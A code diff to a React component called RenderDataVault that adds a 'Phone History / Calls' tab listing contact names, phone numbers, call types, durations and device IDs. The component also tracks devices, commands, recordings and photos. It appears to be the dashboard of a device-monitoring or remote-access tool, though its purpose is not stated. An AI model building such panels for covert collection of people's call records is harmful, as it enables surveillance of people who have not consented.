@@ -63,7 +63,7 @@ export const RenderDataVault: React.FC<RenderDataVaultProps> = ({ onSelectDevice
   const [activeVideo, setActiveVideo] = useState<VaultRecording | null>(null);
   const [playerExactDuration, setPlayerExactDuration] = useState<string | null>(null);
   const [activePhoto, setActivePhoto] = useState<VaultPhoto | null>(null);
-  const [dbTable, setDbTable] = useState<'devices' | 'commands' | 'logs' | 'installedApps'>('devices');
+  const [dbTable, setDbTable] = useState<'devices' | 'commands' | 'logs' | 'installedApps' | 'callLogs'>('devices');
 
   const loadAllVaultData = async () => {
     setLoading(true);
@@ -572,6 +572,14 @@ export const RenderDataVault: React.FC<RenderDataVaultProps> = ({ onSelectDevice
               >
                 Installed Apps ({dbDump?.installedApps?.length || 0})
               </button>
+              <button
+                onClick={() => setDbTable('callLogs')}
+                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition ${
+                  dbTable === 'callLogs' ? 'bg-cyan-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
+                }`}
+              >
+                Phone History / Calls ({dbDump?.callLogs?.length || 0})
+              </button>
             </div>
 
             <div className="text-xs text-slate-400 font-mono">
@@ -620,6 +628,16 @@ export const RenderDataVault: React.FC<RenderDataVaultProps> = ({ onSelectDevice
                       <th className="py-2.5 px-3">Version</th>
                       <th className="py-2.5 px-3">Type</th>
                       <th className="py-2.5 px-3">Device</th>
+                    </tr>
+                  )}
+                  {dbTable === 'callLogs' && (
+                    <tr>
+                      <th className="py-2.5 px-3">Contact / Name</th>
+                      <th className="py-2.5 px-3">Phone Number</th>
+                      <th className="py-2.5 px-3">Type</th>
+                      <th className="py-2.5 px-3">Call Duration</th>
+                      <th className="py-2.5 px-3">Date &amp; Time</th>
+                      <th className="py-2.5 px-3">Device ID</th>
                     </tr>
                   )}
                 </thead>
@@ -724,6 +742,44 @@ export const RenderDataVault: React.FC<RenderDataVaultProps> = ({ onSelectDevice
                           </span>
                         </td>
                         <td className="py-2 px-3 font-mono text-slate-500">{a.deviceId}</td>
+                      </tr>
+                    ))}
+
+                  {dbTable === 'callLogs' &&
+                    (dbDump?.callLogs || []).map((c: any) => (
+                      <tr key={c.id || c.callId} className="hover:bg-slate-800/40">
+                        <td className="py-2 px-3 font-semibold text-white">{c.callerName || c.phoneNumber}</td>
+                        <td className="py-2 px-3 font-mono text-cyan-300">{c.phoneNumber}</td>
+                        <td className="py-2 px-3">
+                          <span
+                            className={`text-[10px] font-mono font-bold px-1.5 py-0.5 rounded border uppercase ${
+                              c.callType === 'INCOMING'
+                                ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30'
+                                : c.callType === 'OUTGOING'
+                                ? 'bg-cyan-500/20 text-cyan-400 border-cyan-500/30'
+                                : c.callType === 'MISSED'
+                                ? 'bg-rose-500/20 text-rose-400 border-rose-500/30'
+                                : 'bg-amber-500/20 text-amber-400 border-amber-500/30'
+                            }`}
+                          >
+                            {c.callType}
+                          </span>
+                        </td>
+                        <td className="py-2 px-3 font-mono font-bold text-white">
+                          <span
+                            className={`px-2 py-0.5 rounded ${
+                              c.durationSeconds > 0
+                                ? 'bg-emerald-950/80 text-emerald-300 border border-emerald-500/30'
+                                : 'bg-slate-800 text-slate-400'
+                            }`}
+                          >
+                            {c.formattedDuration}
+                          </span>
+                        </td>
+                        <td className="py-2 px-3 font-mono text-slate-400 text-xs">
+                          {c.timestamp ? new Date(c.timestamp).toLocaleString() : c.callDate}
+                        </td>
+                        <td className="py-2 px-3 font-mono text-slate-500">{c.deviceId}</td>
                       </tr>
                     ))}
                 </tbody>
